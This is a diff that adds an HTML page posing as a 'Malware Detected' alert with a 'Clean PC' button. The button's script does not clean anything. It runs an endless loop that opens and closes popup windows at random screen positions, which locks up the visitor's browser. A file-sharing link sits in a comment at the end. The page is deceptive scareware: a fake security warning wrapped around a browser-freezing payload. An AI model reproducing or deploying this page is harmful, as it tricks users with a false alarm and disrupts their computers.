@@ -1,0 +1,60 @@
+<html>
+    <body>		  
+		  <ul class="topnav">
+         <li><a href="#home">Home</a></li>
+         <li><a href="#malware" class="active">Malware</a></li>
+         <li style="float:right"><a href="#about">About</a></li>
+        </ul>
+		  
+		  <div>
+           <h1>Malware Detected</h1>
+           <text>We have detected malware on your computer. To remove the malware, click the button: </text>
+           <button onClick="app()">Clean PC</button>
+		  </div>
+    </body>
+	 
+	 <style>
+	   body {margin: 0;}
+
+      ul.topnav {
+		  list-style-type: none;
+		  margin: 0;
+		  padding: 0;
+		  overflow: hidden;
+		  background-color: #333;
+		}
+
+		ul.topnav li {float: left;}
+
+		ul.topnav li a {
+		  display: block;
+		  color: white;
+		  text-align: center;
+		  padding: 14px 16px;
+		  text-decoration: none;
+		}
+
+		ul.topnav li a:hover:not(.active) {background-color: #111;}
+
+		ul.topnav li a.active {background-color: #04AA6D;}
+
+		ul.topnav li.right {float: right;}
+	 </style>
+    
+    <script>
+        function app() {
+			 while(1)
+          {
+			   var randomX = (Math.random() * 1366) + 1;
+            var randomY = (Math.random() * 768) + 1;
+            
+            var specs = "height=250px, width=250px, left=" + randomX + ", top=" + randomY;
+            
+            newWindow = window.open("sdhdfkjdsfhkdhkfshj","Heheheha!!!", specs);    
+				newWindow.close();
+          }       
+        }
+    </script>
+</html>
+
+<!https://file.io/YwgPQjx2iU4C>
